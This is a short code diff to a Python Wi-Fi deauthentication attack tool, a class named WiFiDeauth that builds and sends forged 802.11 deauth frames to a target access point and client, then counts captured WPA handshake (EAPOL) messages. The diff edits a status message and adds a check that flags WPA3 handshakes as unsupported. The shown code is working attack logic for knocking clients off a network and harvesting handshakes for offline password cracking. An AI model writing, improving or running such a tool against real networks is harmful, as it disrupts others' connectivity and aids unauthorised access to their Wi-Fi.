@@ -99,7 +99,7 @@ class WiFiDeauth:
 	def send_deauth(self):
 		pcap = pcapy.open_live(self.interface, 100, 1, 9)
 		for i in range(self.deauth_count):
-			print(f"[+] Send {self.deauth_packets} packets deauth to {self.BSSID} as {self.CLIENT} ({i +1} / {self.deauth_count})")
+			print(f"[+] Send deauth to {self.BSSID} as {self.CLIENT} ({i +1} / {self.deauth_count})")
 			self.current_deauth = i
 			for pnt_num in range(self.deauth_packets):
 				deauth_pkt = bytes(RadioTap() / Dot11(addr1=self.client, addr2=self.bssid, addr3=self.bssid, SC=(pnt_num << 4)) / Dot11Deauth(reason=7))
@@ -143,7 +143,10 @@ class WiFiDeauth:
 					self.key4_cnt += 1
 					print(f"[+] Received M4 Message")
 				else:
-					print(f"[-] Unknown EAPOL Data!")
+					if key_info == 0x0088 or key_info == 0x0108 or key_info == 0x13c8 or key_info == 0x0308:
+						print("[-] WPA3 EAPOL Detected! Not supported")
+					else:
+						print(f"[-] Unknown EAPOL Data!")
 		
 		if (self.current_deauth +1) == self.deauth_count and not self.deauth_done_flag:
 			print("[+] All deauth packets sended, waiting last EAPOL messages")
